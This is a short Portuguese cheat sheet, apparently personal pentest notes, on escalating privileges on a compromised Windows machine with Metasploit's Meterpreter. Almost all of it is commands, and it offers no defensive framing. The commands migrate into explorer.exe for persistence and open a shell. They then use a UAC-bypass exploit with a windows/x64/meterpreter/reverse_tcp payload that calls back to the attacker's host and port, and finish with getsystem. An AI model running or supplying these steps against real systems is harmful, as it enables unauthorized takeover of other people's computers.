## Escalando privilégios no windows

#### Geral:

```
ps          -> Lista os processos.

getpid      -> Mostra o id do processo atual na máquina do alvo.
```

------------------------------------------

#### Persistência:

> Migrando o processo atual para o processo de explorer do windows por exemplo. <br>
Privilégio de nível usuário é o suficiente.

1. Localize o id do processo do windows explorer
2. Depois:

```
migrate process_number
```

3. Conferindo:

```
getpid
```

------------------------------------------

#### Indo para o shell:

```
shell

whoami       

whoami /priv

exit
```

------------------------------------------

#### Desativando o sistema de controle (UAC):

<br>

1. Mande a sessão para background:
```
background 
```

2. Procure por exploits do UAC:
```
search uac 
```
3. Selecione e configure ele:

```
show options

sessions                                          -> Confirme o número da sessão do alvo.

set sessions number_id

set payload windows/x64/meterpreter/reverse_tcp   -> Use o payload préviamente utilizado para invadir o alvo.

set lhost 192.168.x.x                             -> Máquina local 

set lport xxxx                                    -> Tente a mesma porta configurada préviamente para escutar o alvo.
                                                     Se não funcionar tente a padrão 4444 ou outra.
                                                     Caso ainda não funcione, mude de exploit.
exploit
```

* Opcional:

```
exploit -z                                        -> Irá jogar a sessão automáticamente para background.
```

4. Confira a novas sessões:

```
sessions
```

5. Avance para dentro da nova sessão e confira o nivel de privilégio

```
sessions session_number

getuid                            -> Lembre-se, é normal continuar o memso usuário
```

6. Tente escalar privilégio:

```
getsystem

getuid
```





